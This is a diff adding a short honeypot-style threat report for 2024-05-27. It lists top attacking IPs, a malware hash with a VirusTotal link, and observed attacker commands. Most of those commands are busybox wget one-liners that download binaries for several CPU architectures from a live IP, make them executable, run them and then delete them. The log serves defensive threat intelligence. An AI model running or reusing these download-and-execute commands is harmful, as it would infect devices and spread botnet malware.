@@ -1,0 +1,37 @@
+Top 5 IPs for 2024-05-27 :
+
+77.222.187.73
+107.190.184.104
+75.111.120.123
+203.163.233.108
+211.224.41.185
+
+Malware Observed:
+
+c2b65dbea78fbc7281039a2f7ed77764dae5f7578513b9c839b5504b3f06f674
+https://www.virustotal.com/gui/file/c2b65dbea78fbc7281039a2f7ed77764dae5f7578513b9c839b5504b3f06f674
+
+
+
+Commands/exploits observed:
+
+cd /data/local/tmp/; busybox wget http://91.92.249.80/te.sh;sh te.sh
+
+cd /tmp;busybox wget http://91.92.249.80/arm.nn; chmod 777 arm.nn; ./arm.nn arm
+
+cd /tmp;busybox wget http://91.92.249.80/arm5.nn; chmod 777 arm5.nn; ./arm5.nn arm5
+
+cd /tmp;busybox wget http://91.92.249.80/arm6.nn; chmod 777 arm6.nn; ./arm6.nn arm6
+
+cd /tmp;busybox wget http://91.92.249.80/arm7.nn; chmod 777 arm7.nn; ./arm7.nn arm7
+
+cd /tmp;busybox wget http://91.92.249.80/mips.nn; chmod 777 mips.nn; ./mips.nn mips
+
+cd /tmp;busybox wget http://91.92.249.80/mpl.nn; chmod 777 mpl.nn; ./mpl.nn mpsl
+
+cd /tmp;busybox wget http://91.92.249.80/x86.nn; chmod 777 x86.nn; ./x86.nn x86
+
+cd /tmp;busybox wget http://91.92.249.80/x64.nn; chmod 777 x64.nn; ./x64.nn x64
+
+rm -f *.nn;rm -f te.sh
+
